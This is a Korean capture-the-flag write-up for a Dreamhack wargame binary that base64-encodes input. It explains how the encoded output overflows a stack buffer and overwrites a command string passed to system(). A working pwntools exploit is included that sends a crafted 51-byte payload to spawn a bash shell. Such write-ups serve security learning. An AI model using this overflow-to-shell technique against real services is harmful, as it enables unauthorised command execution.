# Base64 Encoder

[문제 링크](https://dreamhack.io/wargame/challenges/2265)

## 코드 분석

문제에서는 실행파일만 제공되기 때문에 디스어셈블한 main함수는 다음과 같다. 

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int v4; // [rsp+Ch] [rbp-B4h] BYREF
  char buf[64]; // [rsp+10h] [rbp-B0h] BYREF
  char dest[64]; // [rsp+50h] [rbp-70h] BYREF
  char command[10]; // [rsp+90h] [rbp-30h] BYREF
  __int16 v8; // [rsp+9Ah] [rbp-26h]
  int v9; // [rsp+9Ch] [rbp-24h]
  __int64 v10; // [rsp+A0h] [rbp-20h]
  __int64 v11; // [rsp+A8h] [rbp-18h]
  char *src; // [rsp+B0h] [rbp-10h]
  int v13; // [rsp+BCh] [rbp-4h]

  strcpy(command, "echo bye");
  command[9] = 0;
  v8 = 0;
  v9 = 0;
  v10 = 0;
  v11 = 0;
  sub_14A9();
  while ( 1 )
  {
    puts("[1] Base64 Encode");
    puts("[2] Exit");
    printf("> ");
    __isoc99_scanf("%d", &v4);
    if ( v4 != 1 )
      break;
    v13 = read(0, buf, 64u);
    src = (char *)sub_1269(buf, v13);
    strcpy(dest, src);
    puts(dest);
    free(src);
  }
  if ( v4 != 2 )
  {
    puts("Invalid input");
    exit(-1);
  }
  system(command);
  return 0;
}
```

다음 프로그램은 단순하게 입력된 값을 Base64로 인코딩 해주는 프로그램이다.

## 취약점 분석

base64의 원리

- 3 바이트 -> 4 문자 변환: 원본 데이터를 3바이트(8 * 3 = 24비트)씩 묶은 후, 이를 6비트씩 4개(6 * 4 = 24비트)의 덩어리로 나눕니다.

- 6비트 매핑 (64진법): 6비트는 (2^6=64)개의 값을 표현할 수 있으므로, 64개의 ASCII 문자(A-Z, a-z, 0-9, +, /)와 매핑하여 텍스트로 변환합니다.

- 패딩 (Padding): 데이터가 3바이트 단위로 떨어지지 않을 경우, 남는 공간을 '=' 문자로 채워 4바이트 배수를 맞춥니다.


즉 이를 통해 볼 수 있는것은 base64로 인코딩시 원본보다 약 33% 크기가 증가한다는 것입니다.

<br>
    

| 메모리 주소 | 크기 | 변수명  | 특징                                 |
| :---------- | :--- | :------ | :----------------------------------- |
| [rbp-0xB0]  | 64   | buf     | 원본 입력 버퍼                       |
| [rbp-0x70]  | 64   | dest    | base64로 인코딩된 값이 들어가는 변수 |
| [rbp-0x30]  | 10   | command | 작동될 명령어 (기본값: "echo bye")   |

<br>

strcpy로 복사되는 데이터의 크기를 의도적으로 조작하여, 앞의 64바이트는 dest를 꽉 채우는 더미로 쓰고, 초과하는 데이터를 command 변수 자리에 안착시키면 프로그램 종료 시 덮어쓴 명령어가 system(command)를 통해 실행됩니다!

## 익스플로잇 구상

Base64 인코딩 결과물은 4의 배수로 떨어지지 않으면 뒤에 4의 배수에 맞도록 =가 붙으므로 4의 배수에 맞는 명령어인 bash를 사용해야 합니다.

더미 64바이트 + bash (4바이트) = 총 68바이트의 Base64 인코딩 문자열이 필요합니다.

68바이트의 인코딩 결과를 만들기 위해 원본 입력으로 몇 바이트를 주어야 할까요?

**68 * (3 / 4) = 51바이트**

즉, 정확히 51바이트의 입력값을 read 함수로 밀어 넣으면 됩니다.

64바이트 더미 만들기: \x00을 48개 넣으면 AAAA... 64개로 인코딩됩니다.

bash 디코딩하기: base64 라이브러리를 이용해서 bash를 디코딩을 수행합니다.

**최종 입력값: \x00 48개 + m\xab! (총 51바이트)**

## 익스플로잇 코드

```python
from pwn import *
import base64

if len(sys.argv) == 3:
    p = remote(sys.argv[1], int(sys.argv[2]))
else:
    p = process('./chall')

payload = b'A' * 48
payload += base64.b64decode(b'bash')

p.sendlineafter(b"> ", b'1')
p.send(payload)
p.sendlineafter(b"> ", b'2')

p.interactive()
```